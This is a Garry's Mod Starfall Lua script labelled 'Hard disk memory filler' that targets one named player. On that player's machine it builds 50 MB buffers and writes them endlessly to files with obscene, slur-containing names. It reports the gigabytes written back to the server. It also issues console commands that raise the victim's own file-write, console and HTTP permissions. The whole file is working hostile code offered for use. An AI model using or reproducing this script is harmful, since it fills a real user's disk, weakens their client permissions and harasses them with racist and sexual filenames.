//--@name Hard disk memory filler
--@name Generic
--@author
--@shared

FileSize = 1 * 1024 * 1024 * 50
LogProgresDelay = 1 -- sec
LogDelay = 5 -- sec

Performance_Cpu_Limit = 0.05 // Manage to perfomance
Progress_Speed = 10


Target = find.playersByName("markiz")[1]

if SERVER then
    chip():setNoDraw(false)
    print(Target)
    
    net.receive("progress_log", function(len, ply)
        local currentTemplateSize = math.round(net.readFloat()/1024/1024, 1) -- mb
        local fullTemplateSize = FileSize / 1024 / 1024 -- mb
        local progress = currentTemplateSize / fullTemplateSize
        print(
            Color(255,255,255), "Player: ",
            team.getColor(ply:getTeam()), ply:getName(),
            Color(255,255,255), " | progress: ",
            Color(255,150,0), math.ceil(progress*100),
            Color(255,255,255), " % | template size: ",
            Color(255,200,0), string.sub(tostring(currentTemplateSize), 1, 5),
            Color(255,255,255), " mb")
    end)
    
    net.receive("log", function(len, ply)
        local totalSize = net.readFloat() / 1024 / 1024 / 1024
        totalSize = math.round(totalSize, 2)
        print(
            Color(255,255,255), "Player: ",
            team.getColor(ply:getTeam()), ply:getName(),
            Color(255,255,255), " | Total created size: ",
            Color(255,200,0), string.sub(tostring(totalSize), 1, 5),
            Color(255,255,255), " gb")
    end)
    
    return
end


if player() != Target then return end


local Names = {"furry","porn","gayPorn","hentai","FullHDporn","NIGGERPORN","kopro","big_ass","fisting","anime_sex","gay"}


function set_cmd()
    if not permissionSatisfied_console then return end
    
    if player() == owner() then
        concmd("sf_permission_cl file.write client 1")
        concmd("sf_permission_cl console.command client 4")
    else
        concmd("sf_permission_cl file.write client 3")
        concmd("sf_permission_cl console.command client 3")
        concmd("sf_permission_cl http.get urlwhitelist 2")
        concmd("sf_timebuffersize_cl 1000")
        concmd("sf_timebuffer_cl 0.05")
    end
end

--setupPermissionRequest({ "console.command" }, "See an example of console.command.", true)
local permissionSatisfied_filewrite = hasPermission("file.write")
local permissionSatisfied_console = hasPermission("console.command")

S = "" 
I = 0
local _totalCreatedSize = 0 -- bytes
_template = ""
_template2 = _template
_is_progress_complited = false
     
function start_spam()
    --print("Spam start")
    hook.add("think","",function()
    --timer.create("spam", 0.5, 0, function()
        if permissionSatisfied or hasPermission("file.write") then
            if math.max(quotaAverage(), quotaUsed()) < quotaMax() * Performance_Cpu_Limit then
                
                SS = math.random(1,table.count(Names))
                SS2 = math.random(1,table.count(Names))
                SS3 = math.random(1,table.count(Names))
                SS4 = math.random(1,table.count(Names))
                SS5 = math.random(1,table.count(Names))
                SS6 = math.random(1,table.count(Names))
                
                I = I + 1
                
                _totalCreatedSize = _totalCreatedSize + FileSize
                file.write(''..I.." - "..Names[SS]..", "..Names[SS2]..", "..Names[SS3]..", "..Names[SS4]..", "..Names[SS5]..", "..Names[SS6].." - "..timer.curtime()..".txt", S)
            end
        end
    end)
    
    timer.create("log", LogDelay, 0, function()
        net.start("log")
        net.writeFloat(_totalCreatedSize)
        net.send()
    end)
end


function start_create_buffer()
    if not permissionSatisfied_filewrite then return end
    
    for i=1, 10 * Progress_Speed do
        _template = _template.._template2
    end

    timer.create("create_buffer", 0.1, 0, function()
    --hook.add("think","create_buffer",function()
        if math.max(quotaAverage(), quotaUsed()) < quotaMax() * Performance_Cpu_Limit then
            for _i=1, 1 do
                local len = string.len(S)
                local lenDiff = FileSize - len
                if len >= FileSize  then
                    timer.remove("create_buffer")
                    _is_progress_complited = true
                    start_spam()
                    return
                elseif lenDiff < string.len(_template) then
                    S = S..string.sub(_template, 1, lenDiff)
                else
                    S = S.._template
                end
                
            end
        end
    end)
    
    timer.create("progress_log", LogProgresDelay, 0, function()
        if _is_progress_complited then
            timer.remove("progress_log")
        end
        
        net.start("progress_log")
        net.writeFloat(string.len(S))
        net.send()
    end)
end


start_create_buffer()
--set_cmd()

if not permissionSatisfied_console then
    hook.add("permissionrequest", "", function()
        permissionSatisfied_console = hasPermission("console.command")
        permissionSatisfied_filewrite = hasPermission("file.write")
        set_cmd()
        start_create_buffer()
    end)
end
